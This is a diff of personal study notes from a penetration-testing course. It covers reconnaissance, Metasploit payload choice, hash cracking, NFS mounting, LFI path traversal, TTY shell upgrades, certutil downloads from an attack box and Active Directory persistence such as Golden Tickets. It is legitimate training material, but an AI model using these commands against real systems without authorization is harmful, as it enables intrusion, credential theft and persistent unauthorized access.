@@ -1,6 +1,6 @@
-Ethical Hacking = EH  
-Pentesting = PT  
-Red Teaming = RT  
+Ethical Hacking = EH
+Pentesting = PT
+Red Teaming = RT
 - terms may be used interchangeably in this doc, unless otherwise indicated
 ==============================================================================================================
 Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
@@ -30,53 +30,53 @@ Data Breaches: HaveIBeenPwned, Breach-Parse, WeLeakInfo
 
 ==============================================================================================================
 ----------------------
-From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)  
-For Kali Linux VMs install and run pimpmykali  
-"Kali Linux Fixes for Newly Imported VM's"  
+From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
+For Kali Linux VMs install and run pimpmykali
+"Kali Linux Fixes for Newly Imported VM's"
 https://github.com/Dewalt-arch/pimpmykali
 ----------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
 * After nmapping an IP some ports will have services that are "low hanging fruit", meaning that they are running services for which a lot of exploits exist. Others will be running services that are less likely to be easily exploitable. Focus on the "low hanging fruit" first.
 
-http/https (80/443) - have many exploits  
+http/https (80/443) - have many exploits
 smb (445; smb also may use NetBIOS ports: TCP 139, TCP/UDP 137, UDP 138) - has many exploits
 
 ssh (22) - does NOT have many exploits that are likely to grant RCE
 
-* When working on testing http/https one of the first things to do is to visit the IP in a webbrowser.  
-* If visiting an IP on a webbrowser brings one to a default webpage that is a finding since it reveals info re the architecture and shows that they have open ports that they are not using (it shows poor hygiene to an attacker and encourages them to look further for misconfigurations)  
-* run Nikto a web app vulnerability scanner (syntax: nikto -h http://<ip_address> and  nikto -h https://<ip_address>) [Note: Nikto may be blocked if the website has a good WAF)  
-* attempt to perform directory busting to find accessible directories on the website:  
-  - there are built in tools in Kali Linux to do this:  
-    - dirbuster (HA's preferred directory busting tool)  
-    - dirb  
-    - gobuster  
+* When working on testing http/https one of the first things to do is to visit the IP in a webbrowser.
+* If visiting an IP on a webbrowser brings one to a default webpage that is a finding since it reveals info re the architecture and shows that they have open ports that they are not using (it shows poor hygiene to an attacker and encourages them to look further for misconfigurations)
+* run Nikto a web app vulnerability scanner (syntax: nikto -h http://<ip_address> and  nikto -h https://<ip_address>) [Note: Nikto may be blocked if the website has a good WAF)
+* attempt to perform directory busting to find accessible directories on the website:
+  - there are built in tools in Kali Linux to do this:
+    - dirbuster (HA's preferred directory busting tool)
+    - dirb
+    - gobuster
 * check webpage's source code for the possible exposure of sensitive information (e.g. usernames and passwords)
 
 * If ssh is open it is worth trying to connect even if you do not know the password, just in case a banner was left exposed that might give you exploitable information.
 ----------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
-Reverse shells vs. bind shells  
-* in EH one uses reverse shells 95% of the time  
+Reverse shells vs. bind shells
+* in EH one uses reverse shells 95% of the time
 * Bind shells come in handy during external PTs where the attack computer is a VM with a private IP using a NAT to present a public IP. It becomes more difficult to set the local IP for the remote host to connect back to. You would need to use the public IP and then use port forwarding. It may be easier in such circumstances to use a bind shell instead. With a bind shell your local IP does not make a difference; you just connect to the remote host IP port you have opened. Bind shells may also be needed if the firewall is blocking the reverse shell or if the reverse shell is just not working for some unknown reason.
 -----------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
 Staged payloads vs. non-staged payloads in Meterpreter
 
-Staged payloads are sent to the target machine in stages. Each file that is sent is smaller and therefore less likely to fail. However, the resultant shell is sometimes unstable and liable to dropping while in use.  
+Staged payloads are sent to the target machine in stages. Each file that is sent is smaller and therefore less likely to fail. However, the resultant shell is sometimes unstable and liable to dropping while in use.
 Non-staged payloads are sent to the target machine all at once. The one file that is sent is larger in size and sometimes fails for this reason.
 
-Once can tell the difference between the two types in Meterpreter as follows:  
-windows/meterpreter_reverse_tcp - non-staged [that is why meterpreter is attached to reverse tcp with an underscore]  
+Once can tell the difference between the two types in Meterpreter as follows:
+windows/meterpreter_reverse_tcp - non-staged [that is why meterpreter is attached to reverse tcp with an underscore]
 windows/meterpreter/reverse_tcp - staged [that is why meterpreter is divided from reverse_tcp with a forward slash; in order to show that the parts of the payload are divided up]
 
 Note: If one is having problems with a staged payload; try the same payload non-staged (and vice versa). If one is having problem with a reverse shell; try the same exploit with a bind shell (and vice versa). Try all possible combinations.
 
-Note: when you first run an exploit in Metasploit it may run a particular payload by default. If the exploit does not work (e.g. the shell keeps dying), use `set payload` to change to a different payload.  
-Also, make sure that the LHOST populated correctly.  
+Note: when you first run an exploit in Metasploit it may run a particular payload by default. If the exploit does not work (e.g. the shell keeps dying), use `set payload` to change to a different payload.
+Also, make sure that the LHOST populated correctly.
 Also, it may be worthwhile to change the local port from 4444 (the Metasploit default port) to a different port number, because AVs may be configured to alert immediately upon seeing port 4444.
 ------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
@@ -99,8 +99,8 @@ When conducting a PT (as opposed to RT) one often is deliberately "noisy" while 
 ------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
-* In Metasploit make sure that your payload matches the architecture of the machine you are attacking. If the default payload is an x86 intended for 32-bit machines and the machine you are trageting is a 64-bit machine make sure you change the payload to an x64.  
-* It is a good idea to use a meterpreter payload if possible because it provides you with a better CLI for your remote shell.\  
+* In Metasploit make sure that your payload matches the architecture of the machine you are attacking. If the default payload is an x86 intended for 32-bit machines and the machine you are trageting is a 64-bit machine make sure you change the payload to an x64.
+* It is a good idea to use a meterpreter payload if possible because it provides you with a better CLI for your remote shell.\
 * Meterpreter has a command `hashdump` which automatically pulls password hashes from the machine you are exploiting.
 ------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
@@ -117,15 +117,15 @@ From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Cou
 
 Cracking hashes
 ----------------
-* Heath Adams prefers hashcat to john the ripper as a hashcracking tool.  
-* When running hashcat (or another password cracking program) it will go much faster if it is run on the base OS as opposed to in a VM. This is because a VM will use the CPU to run hashcat; whereas, if you run it in the base OS you will be utilizing your GPU which is faster than the CPU. [Note: hashcat can run on a Windows OS.]  
+* Heath Adams prefers hashcat to john the ripper as a hashcracking tool.
+* When running hashcat (or another password cracking program) it will go much faster if it is run on the base OS as opposed to in a VM. This is because a VM will use the CPU to run hashcat; whereas, if you run it in the base OS you will be utilizing your GPU which is faster than the CPU. [Note: hashcat can run on a Windows OS.]
 * The more GPU cards a machine has, the faster it will crack hashes. PT organizations will often have a designated "cracking rig" with multiple GPUs installed that is used solely for cracking purposes.
 --------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
-A helpful tool for discovering running processes in Linux (useful for enumeration and privilege escalation).  
-https://github.com/DominicBreuker/pspy  
-"pspy - unprivileged Linux process snooping  
+A helpful tool for discovering running processes in Linux (useful for enumeration and privilege escalation).
+https://github.com/DominicBreuker/pspy
+"pspy - unprivileged Linux process snooping
 pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.
 
 The tool gathers the info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes."
@@ -134,13 +134,13 @@ From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Cou
 
 When encountering a Linux file share service (such as Network File System [nfs] port 2049) on a machine you are PTing the following commands are useful:
 
-* showmount -e <target_machine_ip>  
-the output will list the name of the share, e.g. /srv/nfs  
-you then create a directory on your device to mount to:  
-* mkdir /mnt/<name_you_give_directory> [note: the /mnt is on your Linux machine already by default]  
-then you mount the file-share to your machine  
-* mount -t nfs <target_machine_ip>:<name_of_the_share, e.g. /srv/nfs> </mnt/<name_you_gave_directory>  
-the -t designates the type of share it is; in this case: nfs.  
+* showmount -e <target_machine_ip>
+the output will list the name of the share, e.g. /srv/nfs
+you then create a directory on your device to mount to:
+* mkdir /mnt/<name_you_give_directory> [note: the /mnt is on your Linux machine already by default]
+then you mount the file-share to your machine
+* mount -t nfs <target_machine_ip>:<name_of_the_share, e.g. /srv/nfs> </mnt/<name_you_gave_directory>
+the -t designates the type of share it is; in this case: nfs.
 you can then cd into </mnt/<name_you_gave_directory> and access the files that were shared
 --------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
@@ -149,20 +149,20 @@ The tool fcrackzip can be used to crack password protected zip files:
 
 > sudo apt install fcrackzip
 
-> fcrackzip -V -p </path/to/wordlist> </path/to/zipped/file>  
--V = verbose  
--u = unzip  
--D = use Dictionary Attack  
+> fcrackzip -V -p </path/to/wordlist> </path/to/zipped/file>
+-V = verbose
+-u = unzip
+-D = use Dictionary Attack
 -p = file containing wordlist to be used in Dictionary Attack
 --------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
-A Local File Inclusion (LFI) vulnerability on a webpage may allow you to expose files running on a server and thereby attain information disclosure, remote code execution (RCE), and cross-site scripting (XSS).  
+A Local File Inclusion (LFI) vulnerability on a webpage may allow you to expose files running on a server and thereby attain information disclosure, remote code execution (RCE), and cross-site scripting (XSS).
 It results from a coding error on the development side and allows you to add things like `../../../../etc/passwd` to the end of the url and gain access to files that you were not intended to see. 
 --------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
-When transfering files to a Windows machine you have gained initial access (e.g. you want to put WinPeas on it to search for privilege escalation paths) you can transfer the file from the web server you created on your Kali Linux (python3 -m http.server 80) by using certutil:  
+When transfering files to a Windows machine you have gained initial access (e.g. you want to put WinPeas on it to search for privilege escalation paths) you can transfer the file from the web server you created on your Kali Linux (python3 -m http.server 80) by using certutil:
 > certutil -urlcache -f http://<attack_box_ip>/<name_of_file_being_transfered> <name_you_want_file_to_have_on_target_machine>
 --------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
@@ -171,15 +171,15 @@ Virtual Host Routing [NOTE: VIRTUAL HOST ROUTING IS COMMON IN CTF SCENARIOS!]
 
 If a target IP address has DNS running on it in addition to a webserver (for example, if you see that besides having port 80 or port 443 open it also has port 53 open) this may be a signal that there is an "http server virtual host" running within the server associated with the target IP. Practically, this means that if you navigate to http://<target_ip_address> you may see one webpage with all sorts of subdirectories associated with it (because that is the default host domain for the IP) - but, there may be a whole, different, virtual host domain also associated with the same IP, but you can not see it. How do you find the virtual host domain and access it through you browser?
 
-First run dnsrecon:  
+First run dnsrecon:
 > dnsrecon -r 127.0.0.0/24 -n <target_ip> -d <this stands for domain; in order for dnsrecon to work you must put a domain in here; however, the whole point is that you are searching for the domain, so just put anything in here [e.g. test] and the output will give you the domain name you are seeking>
 
-The output should look something like this:  
-PTR <domain_name>.<TLD>  
+The output should look something like this:
+PTR <domain_name>.<TLD>
 [PTR means a DNS pointer record]
 
-Now that you know the name of the virtual host domain, the next step is to add the domain you discovered to your attack box's /etc/hosts file:  
-> nano /etc/hosts  
+Now that you know the name of the virtual host domain, the next step is to add the domain you discovered to your attack box's /etc/hosts file:
+> nano /etc/hosts
 add: <target_ip> <domain.TLD> to the DNS list in the file, and save
 
 You should now be able to close your browser and then reopen it and navigate to http://<domain_name>.<TLD>. [Note: you may need to close and open your browser more than once before this works.]
@@ -190,67 +190,67 @@ Now you have access to a website that was hidden when you went to http://<target
 --------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
-When receiving a meterpreter prompt, entering the command `shell` will give you a shell:  
+When receiving a meterpreter prompt, entering the command `shell` will give you a shell:
 meterpreter > shell
 
 However, this will not be a fully functional shell as represented by the fact that there is no prompt. In order to get a full tty shell see below.
 --------------------------
-From: https://steflan-security.com/linux-tty-shell-cheat-sheet/ [with some editing of layout]  
-Linux TTY Shell Cheat Sheet  
+From: https://steflan-security.com/linux-tty-shell-cheat-sheet/ [with some editing of layout]
+Linux TTY Shell Cheat Sheet
 May 13, 2021 | by Stefano Lanaro
 
-Introduction  
+Introduction
 During a penetration test, when obtaining access to a remote Linux host via a reverse/bind shell, it can be very painful to issue certain commands over it and it is often a much better option to obtain an interactive shell. These are the main reason why this is a good idea:
 
-* More shell stability, as things like CTRL+C will no longer close down the connection.  
-* Ability to use up, down, left, and right arrows to navigate through and modify commands.  
-* Ability to use applications or commands that use a login prompt such as Sudo, MySQL, SSH, etc.  
-* Ability to use tab-auto completion in commands.  
+* More shell stability, as things like CTRL+C will no longer close down the connection.
+* Ability to use up, down, left, and right arrows to navigate through and modify commands.
+* Ability to use applications or commands that use a login prompt such as Sudo, MySQL, SSH, etc.
+* Ability to use tab-auto completion in commands.
 * Ability to view commands, output, and file contents in the same terminal size as the host machine.
 
 This article will list the various commands that can be used to obtain a TTY shell and also how to turn it into a fully interactive shell.
 
-Cheat Sheet  
+Cheat Sheet
 The following table contains commands to execute in various scripting languages and tools to
 
-Command                                             Description  
-python -c ‘import pty; pty.spawn(“/bin/bash”)’	    Python BASH TTY shell  
-python3 -c ‘import pty; pty.spawn(“/bin/bash”)’     Python 3 BASH TTY shell  
-echo os.system(‘/bin/bash’)	                        Echo BASH TTY shell  
-/bin/bash -i	                                      BASH TTY shell  
-perl -e ‘exec “/bin/bash”;’	                        Perl BASH TTY shell  
-ruby -e ‘exec “/bin/bash”‘	                        Ruby BASH TTY shell  
-lua -e ‘os.execute(‘/bin/bash’)’	                  Lua BASH TTY shell  
-exec “/bin/bash”	                                  IRB BASH TTY shelll  
-:!bash	                                            Vi/Vim BASH TTY shell  
-:set shell=/bin/bash:shell	                        Vi/Vim BASH TTY shell  
-CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0	          Nano BASH TTY shell  
+Command                                             Description
+python -c ‘import pty; pty.spawn(“/bin/bash”)’	    Python BASH TTY shell
+python3 -c ‘import pty; pty.spawn(“/bin/bash”)’     Python 3 BASH TTY shell
+echo os.system(‘/bin/bash’)	                        Echo BASH TTY shell
+/bin/bash -i	                                      BASH TTY shell
+perl -e ‘exec “/bin/bash”;’	                        Perl BASH TTY shell
+ruby -e ‘exec “/bin/bash”‘	                        Ruby BASH TTY shell
+lua -e ‘os.execute(‘/bin/bash’)’	                  Lua BASH TTY shell
+exec “/bin/bash”	                                  IRB BASH TTY shelll
+:!bash	                                            Vi/Vim BASH TTY shell
+:set shell=/bin/bash:shell	                        Vi/Vim BASH TTY shell
+CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0	          Nano BASH TTY shell
 !bash	                                              Nmap BASH TTY shell
 
-Obtaining a Fully Interactive Shell  
+Obtaining a Fully Interactive Shell
 The commands used above can also be issued with sh or /bin/sh, rather than bash or /bin/bash, if BASH is not an option. Once a TTY shell has been achieved, the following commands can be used in order to obtain a fully interactive shell:
 
-#backgrounding the shell process  
+#backgrounding the shell process
 Ctrl-Z
 
-#checking the number of rows and columns in the host terminal  
+#checking the number of rows and columns in the host terminal
 stty -a
 
-#setting terminal settings like new line, break characters etc.  
+#setting terminal settings like new line, break characters etc.
 stty raw -echo
 
-#returning to the shell  
+#returning to the shell
 fg + ENTER
 
-#declaring environment variables to be able to use cllear etc. and colors  
-reset  
-export SHELL=bash  
+#declaring environment variables to be able to use cllear etc. and colors
+reset
+export SHELL=bash
 export TERM=xterm-256color
 
-#setting the terminal rows and columns based on the host configuration  
+#setting the terminal rows and columns based on the host configuration
 stty rows <num> columns <cols>
 
-Conclusion  
+Conclusion
 Having a fully interactive shell can help immensely while enumerating a given host, performing post exploitation techniques and attempting to escalate privileges, and as most Linux systems come with Python or other scripting languages already installed, obtaining one should be fairly effortless.
 
 [For a discussion of the history of the terms "Terminal, Shell, TTY, and Console" see: https://www.baeldung.com/linux/terminal-shell-tty-vs-console --MagVeTs]
@@ -271,7 +271,7 @@ From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Cou
 
 * accounts with no log-ins ever (such as might be shown in the output from mitm6) may be honeypots
 
-* if scans are taking awhile and no hashes are being captured - try looking at websites (e.g. use the http_version tool within msfconsole on Metasploit)  
+* if scans are taking awhile and no hashes are being captured - try looking at websites (e.g. use the http_version tool within msfconsole on Metasploit)
  to see what hosts are alive and look for default credentials (e.g. on Jenkins)
 
 * make sure to consider looking for default credentials on printers and the like (e.g. Pass-Back Attack [https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack])
@@ -284,39 +284,39 @@ From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Cou
 
 * remember that ENUMERATION is the most fundamental part of pentesting, etc. - everything is built on what is discovered through enumeration
 --------------------------
-from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course  
+from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
 "Post-Domain Compromise Attack Strategy" - https://academy.tcm-sec.com/courses/1152300/lectures/48496778
 
-- After obtaining Domain Admin access to a DC in an AD environment, if you have more time on the engagement, it is recommended to:  
-* start over and find a different method of compromise (this gives the client added value)  
-* dump the NTDS.dit and crack all the passwords found there  
-* enumerate domain shares and search for sensitive info (e.g. PII) that might not be supposed to be there  
-* establish persistence by creating a new Domain Admin account; this will also test if the client notices it (MAKE SURE TO DELETE IT AT THE END OF THE ENGAGEMENT)  
+- After obtaining Domain Admin access to a DC in an AD environment, if you have more time on the engagement, it is recommended to:
+* start over and find a different method of compromise (this gives the client added value)
+* dump the NTDS.dit and crack all the passwords found there
+* enumerate domain shares and search for sensitive info (e.g. PII) that might not be supposed to be there
+* establish persistence by creating a new Domain Admin account; this will also test if the client notices it (MAKE SURE TO DELETE IT AT THE END OF THE ENGAGEMENT)
 * establish persistence by creating a Golden Ticket
 --------------------------
-from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course  
-HA has three AD attack case studies; two of them exist both as in-depth blog posts and as high-level video overviews in the course. One is just a video.  
-Here are the links:  
-*  AD Case Study #1 - https://academy.tcm-sec.com/courses/1152300/lectures/48475902  
-   https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security  
-*  AD Case Study #2 - https://academy.tcm-sec.com/courses/1152300/lectures/48475903  
-   https://tcm-sec.com/pentest-tales-002-digging-deep  
+from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
+HA has three AD attack case studies; two of them exist both as in-depth blog posts and as high-level video overviews in the course. One is just a video.
+Here are the links:
+*  AD Case Study #1 - https://academy.tcm-sec.com/courses/1152300/lectures/48475902
+   https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security
+*  AD Case Study #2 - https://academy.tcm-sec.com/courses/1152300/lectures/48475903
+   https://tcm-sec.com/pentest-tales-002-digging-deep
 *  AD Case Study #3 - https://academy.tcm-sec.com/courses/1152300/lectures/48475904
 --------------------------
-from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course  
+from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
 "Cleaning Up" - https://academy.tcm-sec.com/courses/1152300/lectures/24781513
 
-When the PT is done the environment must be returned to the state it was in before the PT. This includes:  
-* Removing all added executables, scripts, and files.  
-* Removing all malware and rootkits.  
-* Removing all added user accounts.  
+When the PT is done the environment must be returned to the state it was in before the PT. This includes:
+* Removing all added executables, scripts, and files.
+* Removing all malware and rootkits.
+* Removing all added user accounts.
 * Returning all settings back to their original configurations.
 
 [NOTE: In order to be able to do this, it is important to take a careful notes of every action that is taken within the environment. These notes will allow you to revert everything back to its original state when the PT is over. --MagVeTs]
 
 In a true Redteam scenario one would also go into the log files and remove all traces of actions taken in the environment.
 --------------------------
-from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course  
+from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
 "Finding Subdomains with Amass" - https://academy.tcm-sec.com/courses/1152300/lectures/24781572
 
 It is recommended to use multiple subdomain/related domain enumeration tools (e.g. Assetfinder, Amass, etc.) in order to avoid inadvertently missing a subdomain or related domain that does not appear in one of the tools
@@ -327,13 +327,13 @@ from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete 
 
 "001_Common_Legal_Documents" - https://academy.tcm-sec.com/courses/1152300/lectures/24793691
 
-"002_Pentest_Report_Writing" - https://academy.tcm-sec.com/courses/1152300/lectures/24793688  
+"002_Pentest_Report_Writing" - https://academy.tcm-sec.com/courses/1152300/lectures/24793688
 also see: https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report
 
 "003_Reviewing_a_Real_Pentest_Report" - https://academy.tcm-sec.com/courses/1152300/lectures/24793692
 --------------------------
-pwndoc  
-https://github.com/pwndoc/pwndoc  
-"Pentest Report Generator"  
-"PwnDoc is a pentest reporting application making it simple and easy to write your findings and generate a customizable Docx report.  
+pwndoc
+https://github.com/pwndoc/pwndoc
+"Pentest Report Generator"
+"PwnDoc is a pentest reporting application making it simple and easy to write your findings and generate a customizable Docx report.
 The main goal is to have more time to Pwn and less time to Doc by mutualizing data like vulnerabilities between users."
